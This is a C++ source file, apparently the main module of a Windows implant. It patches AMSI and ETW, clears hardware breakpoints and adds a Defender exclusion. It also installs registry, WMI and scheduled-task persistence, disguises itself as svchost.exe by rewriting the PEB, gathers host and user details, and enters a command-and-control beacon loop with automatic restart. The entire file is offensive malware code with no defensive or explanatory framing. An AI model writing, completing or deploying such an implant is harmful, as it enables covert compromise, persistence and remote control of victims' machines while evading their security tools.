#include <windows.h>
#include <shellapi.h>
#include <algorithm>
#include <stdarg.h>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"
#include <string>

// ─── Debug log — pure Win32, no CRT, works from first instruction ─────────────
#ifdef DEBUG
static void DBG(const char* fmt, ...) {
    char buf[512];
    va_list va;
    va_start(va, fmt);
    wvsprintfA(buf, fmt, va);
    va_end(va);
    lstrcatA(buf, "\r\n");
    OutputDebugStringA(buf);
    HANDLE hf = CreateFileA("C:\\Users\\Public\\ghost_debug.log",
        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(hf, buf, (DWORD)lstrlenA(buf), &w, NULL);
        CloseHandle(hf);
    }
}
#else
#define DBG(...) do {} while(0)
#endif

static void NtSleep(DWORD ms) {
    typedef NTSTATUS(NTAPI* Fn)(BOOLEAN, PLARGE_INTEGER);
    static Fn pfn = nullptr;
    if (!pfn) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        if (h) pfn = reinterpret_cast<Fn>(HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfn) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfn(FALSE, &li);
    } else {
        Sleep(ms);
    }
}

static void DecoyLoop() {
    volatile unsigned long long fib = 1, a = 0, b = 1;
    for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
}

DWORD WINAPI ImplantThread(LPVOID) {
    DBG("ImplantThread start pid=%lu", GetCurrentProcessId());

#ifndef DEBUG
    // Loop — not return. Returning 1 triggers WinMain restart which re-checks
    // immediately, causing an infinite sleep-restart cycle that looks like a crash.
    while (SandboxCheck()) {
        DBG("sandbox: early boot, waiting");
        DeepSleep();
    }
    DBG("sandbox: cleared");
#endif

    DBG("DecoyLoop");
    DecoyLoop();
    DBG("DecoyLoop done");

    DBG("InitializeSyscalls");
    try {
        int n = 0;
        while (!InitializeSyscalls()) {
            DBG("InitializeSyscalls fail attempt %d", ++n);
            if (n >= 5) return 1;
            NtSleep(5000);
        }
    } catch(...) {
        DBG("InitializeSyscalls EXCEPTION");
        return 1;
    }
    DBG("InitializeSyscalls ok");

    BOOL amsiOk = FALSE, etwOk = FALSE, hwbpOk = FALSE;
    try { amsiOk = PatchAMSI(); } catch(...) { DBG("PatchAMSI EXCEPTION"); }
    try { etwOk  = PatchETW();  } catch(...) { DBG("PatchETW EXCEPTION"); }
    try { hwbpOk = ClearHardwareBreakpoints(); } catch(...) { DBG("ClearHWBP EXCEPTION"); }
    DBG("evasion done amsi=%d etw=%d hwbp=%d", (int)amsiOk, (int)etwOk, (int)hwbpOk);

    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    if (IsElevated()) {
        try { AddDefenderExclusion(exePath); } catch(...) { DBG("DefenderExclusion EXCEPTION"); }
    }
    DBG("defender exclusion done, elevated=%d", (int)IsElevated());

    DBG("persistence: registry start");
    try { InstallRegistryPersistence(exePath); } catch(...) { DBG("registry EXCEPTION"); }
    DBG("persistence: registry done");

    // WMI + schtask run async — ConnectServer can hang indefinitely on busy WMI
    struct PersistCtx { wchar_t path[MAX_PATH]; };
    auto* ctx = new PersistCtx{};
    wcscpy_s(ctx->path, exePath);
    CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
        auto* c = static_cast<PersistCtx*>(p);
        try {
            if (!IsWmiPersistenceInstalled()) {
                InstallWmiPersistence(c->path);
                InstallWmiScriptPersistence(c->path);
            }
            if (!IsScheduledTaskInstalled())
                InstallScheduledTaskPersistence(c->path);
        } catch(...) {}
        delete c;
        return 0;
    }, ctx, 0, nullptr);
    DBG("persistence done (WMI/schtask async)");

    // Build session here from already-completed evasion — never re-patch in BeaconLoop
    Session session;
    session.hostname     = GetHostname();
    session.username     = GetUsername();
    session.build        = GetOSBuild();
    session.elevated     = IsElevated();
    session.amsiPatched  = amsiOk;
    session.etwPatched   = etwOk;
    session.hwbpsCleared = hwbpOk;
    session.sessionId    = GetHostnameHash() + L"|" + session.username;
    DBG("session=%ls", session.sessionId.c_str());

    DBG("BeaconLoop start");
    try {
        BeaconLoop(session);
    } catch(...) {
        DBG("BeaconLoop EXCEPTION");
        return 1;
    }
    DBG("BeaconLoop returned");
    return 0;
}

// ─── PEB image name spoof ─────────────────────────────────────────────────────
// Overwrites PEB.ProcessParameters.ImagePathName and CommandLine with a
// believable system path. Task Manager and most tools read from the PEB —
// not from the filesystem — so this changes what shows in the process list.
static void SpoofPEB() {
    typedef struct _PEB_LDR_HACK {
        BYTE Reserved1[16];
        PVOID Reserved2[10];
        UNICODE_STRING ImagePathName;
        UNICODE_STRING CommandLine;
    } RTL_USER_PROCESS_PARAMETERS_HACK;

    typedef struct _PEB_HACK {
        BYTE Reserved1[2];
        BYTE BeingDebugged;
        BYTE Reserved2[1];
        PVOID Reserved3[2];
        PVOID Ldr;
        RTL_USER_PROCESS_PARAMETERS_HACK* ProcessParameters;
    } PEB_HACK;

#ifdef _WIN64
    PEB_HACK* peb = reinterpret_cast<PEB_HACK*>(__readgsqword(0x60));
#else
    PEB_HACK* peb = reinterpret_cast<PEB_HACK*>(__readfsdword(0x30));
#endif
    if (!peb || !peb->ProcessParameters) return;

    // Target spoof: svchost.exe running under a common service
    static wchar_t fakePath[] =
        L"C:\\Windows\\System32\\svchost.exe";
    static wchar_t fakeCmd[] =
        L"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule";

    auto& ip  = peb->ProcessParameters->ImagePathName;
    auto& cmd = peb->ProcessParameters->CommandLine;

    DWORD old = 0;
    VirtualProtect(ip.Buffer,  ip.MaximumLength,  PAGE_READWRITE, &old);
    VirtualProtect(cmd.Buffer, cmd.MaximumLength, PAGE_READWRITE, &old);

    // Write fake strings — lengths must not exceed original buffer
    USHORT pathBytes = static_cast<USHORT>(wcslen(fakePath) * sizeof(wchar_t));
    USHORT cmdBytes  = static_cast<USHORT>(wcslen(fakeCmd)  * sizeof(wchar_t));

    if (pathBytes <= ip.MaximumLength) {
        memcpy(ip.Buffer,  fakePath, pathBytes);
        ip.Length = pathBytes;
    }
    if (cmdBytes <= cmd.MaximumLength) {
        memcpy(cmd.Buffer, fakeCmd, cmdBytes);
        cmd.Length = cmdBytes;
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    SpoofPEB();

    DBG("===== WinMain pid=%lu elevated=%d =====",
        GetCurrentProcessId(), (int)IsElevated());

    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    HMODULE hK32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hK32) { DBG("kernel32 null"); return 0; }

    auto _CreateThread        = HASHPROC(hK32, CreateThread);
    auto _WaitForSingleObject = HASHPROC(hK32, WaitForSingleObject);
    auto _CloseHandle         = HASHPROC(hK32, CloseHandle);
    auto _GetExitCodeThread   = HASHPROC(hK32, GetExitCodeThread);

    DBG("procs CT=%lu WFSO=%lu CH=%lu GECT=%lu",
        (DWORD)(DWORD_PTR)_CreateThread,
        (DWORD)(DWORD_PTR)_WaitForSingleObject,
        (DWORD)(DWORD_PTR)_CloseHandle,
        (DWORD)(DWORD_PTR)_GetExitCodeThread);

    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
        DBG("HASHPROC failed");
        return 0;
    }

    DWORD restartCount = 0;
    while (true) {
        if (restartCount > 0) {
            DWORD backoff = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
            DBG("backoff %lums restart#%lu", backoff, restartCount);
            Sleep(backoff);
        }
        DBG("spawning ImplantThread #%lu", restartCount);
        HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
        if (!hThread) {
            DBG("CreateThread failed err=%lu", GetLastError());
            Sleep(5000); ++restartCount; continue;
        }
        _WaitForSingleObject(hThread, INFINITE);
        DWORD code = 0;
        _GetExitCodeThread(hThread, &code);
        _CloseHandle(hThread);
        DBG("ImplantThread exit code=%lu", code);
        if (code == 0) { DBG("clean exit"); return 0; }
        ++restartCount;
    }
}
